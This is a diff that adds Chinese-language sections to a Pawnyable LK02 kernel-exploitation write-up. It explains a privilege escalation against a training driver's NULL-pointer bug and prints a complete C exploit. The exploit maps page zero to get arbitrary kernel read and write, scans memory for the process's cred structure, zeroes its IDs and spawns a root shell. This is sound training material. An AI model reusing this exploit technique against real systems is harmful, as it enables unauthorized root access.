@@ -349,3 +349,206 @@ int main() {
 
 ![image-20250619150558758](Pawnyable_LK02_defence_null_poniter.assets/image-20250619150558758.png)
 
+那么如何利用这个漏洞提权呢？
+
+本次的实验环境不存在数据泄露，无法像前几次一样泄露内核基址。这次采取的办法是爆破，通过搜索找到进程的cred结构体，并修改其中的id标志位来完成提权。
+
+根据网上查到的资料，cred结构体在kaslr机制的作用下的变化范围是：
+
+```
+0xffff888000000000~0xffffc88000000000
+```
+
+所以我们将在这个地址范围内尝试强搜出cred结构体：
+
+```c
+prctl(PR_SET_NAME, "deadbeef"); //将当前的进程名改为deadbeef
+  unsigned long addr;
+  size_t stride = 0x1000000;
+  char *needle, *buf = malloc(stride);
+  if (!buf)
+    fatal("malloc(stride)");
+  for (addr = 0xffff888000000000; addr < 0xffffc88000000000; addr += stride) {
+    if (addr % 0x10000000000 == 0)
+      printf("[*] Searching 0x%016lx...\n", addr);
+
+    if (AAR(buf, (char *)addr, stride) != 0)
+      continue;
+
+    if (needle = memmem(buf, stride, "deadbeef", 8)) {
+      addr += (needle - buf);
+      printf("[+] Found comm: 0x%016lx\n", addr);
+      break;
+    }
+  }
+  if (addr == 0xffffc88000000000) {
+    puts("[-] Not found");
+    exit(1);
+  }
+
+  unsigned long addr_cred;
+  AAR((char *)&addr_cred, (char *)(addr - 8), 8);
+  printf("[+] cred: 0x%016lx\n", addr_cred);
+
+  char zero[0x20] = {0};
+  AAW((char *)(addr_cred + 4), zero, sizeof(zero));
+
+  puts("[+] Win!");
+  system("/bin/sh");
+```
+
+**tips：task_struct结构体中存储进程名称的部分是：`char comm[TASK_COMM_LEN]`，在这个comm字段的前面0x8处即是：`const struct cred* cred`，也就是cred结构体**
+
+另外，找到cred结构体进行覆写提权的时候，注意到这里覆写时加上了一个0x4的偏移：
+
+```c
+AAW((char *)(addr_cred + 0x4), zero, sizeof(zero));
+```
+
+这是由于在cred结构体中，在8个ID字段之前还有一个字段：
+
+```
+atomic_t	usage;
+```
+
+这个atomic_t类型可以查到是一个4字节大小的字段，所以这里要加上一个0x4的偏移。
+
+
+
+总的exp为：
+
+```c
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/prctl.h>
+#include <unistd.h>
+
+#define CMD_INIT 0x13370001
+#define CMD_SETKEY 0x13370002
+#define CMD_SETDATA 0x13370003
+#define CMD_GETDATA 0x13370004
+#define CMD_ENCRYPT 0x13370005
+#define CMD_DECRYPT 0x13370006
+
+typedef struct {
+  char *key;
+  char *data;
+  size_t keylen;
+  size_t datalen;
+} XorCipher;
+
+typedef struct {
+  char *ptr;
+  size_t len;
+} request_t;
+
+void fatal(const char *msg) {
+  perror(msg);
+  exit(1);
+}
+
+int fd;
+
+int angus_init(void) {
+  request_t req = {NULL};
+  return ioctl(fd, CMD_INIT, &req);
+}
+int angus_setkey(char *key, size_t keylen) {
+  request_t req = {.ptr = key, .len = keylen};
+  return ioctl(fd, CMD_SETKEY, &req);
+}
+int angus_setdata(char *data, size_t datalen) {
+  request_t req = {.ptr = data, .len = datalen};
+  return ioctl(fd, CMD_SETDATA, &req);
+}
+int angus_getdata(char *data, size_t datalen) {
+  request_t req = {.ptr = data, .len = datalen};
+  return ioctl(fd, CMD_GETDATA, &req);
+}
+int angus_encrypt() {
+  request_t req = {NULL};
+  return ioctl(fd, CMD_ENCRYPT, &req);
+}
+int angus_decrypt() {
+  request_t req = {NULL};
+  return ioctl(fd, CMD_ENCRYPT, &req);
+}
+
+XorCipher *nullptr = NULL;
+
+int AAR(char *dst, char *src, size_t len) {
+  nullptr->data = src;
+  nullptr->datalen = len;
+  return angus_getdata(dst, len);
+}
+
+void AAW(char *dst, char *src, size_t len) {
+  char *tmp = (char *)malloc(len);
+  if (tmp == NULL)
+    fatal("malloc");
+  AAR(tmp, dst, len);
+
+  for (size_t i = 0; i < len; i++)
+    tmp[i] ^= src[i];
+
+  nullptr->data = dst;
+  nullptr->datalen = len;
+  nullptr->key = tmp;
+  nullptr->keylen = len;
+  angus_encrypt();
+
+  free(tmp);
+}
+
+int main() {
+  fd = open("/dev/angus", O_RDWR);
+  if (fd == -1)
+    fatal("/dev/angus");
+
+  if (mmap(0, 0x1000, PROT_READ | PROT_WRITE,
+           MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1,
+           0) != NULL)
+    fatal("mmap");
+
+  prctl(PR_SET_NAME, "deadbeef");
+  unsigned long addr;
+  size_t stride = 0x1000000;
+  char *needle, *buf = malloc(stride);
+  if (!buf)
+    fatal("malloc(stride)");
+  for (addr = 0xffff888000000000; addr < 0xffffc88000000000; addr += stride) {
+    if (addr % 0x10000000000 == 0)
+      printf("[*] Searching 0x%016lx...\n", addr);
+
+    if (AAR(buf, (char *)addr, stride) != 0)
+      continue;
+
+    if (needle = memmem(buf, stride, "deadbeef", 8)) {
+      addr += (needle - buf);
+      printf("[+] Found comm: 0x%016lx\n", addr);
+      break;
+    }
+  }
+  if (addr == 0xffffc88000000000) {
+    puts("[-] Not found");
+    exit(1);
+  }
+
+  unsigned long addr_cred;
+  AAR((char *)&addr_cred, (char *)(addr - 8), 8);
+  printf("[+] cred: 0x%016lx\n", addr_cred);
+
+  char zero[0x20] = {0};
+  AAW((char *)(addr_cred + 4), zero, sizeof(zero));
+
+  puts("[+] Win!");
+  system("/bin/sh");
+  return 0;
+}
+```
+
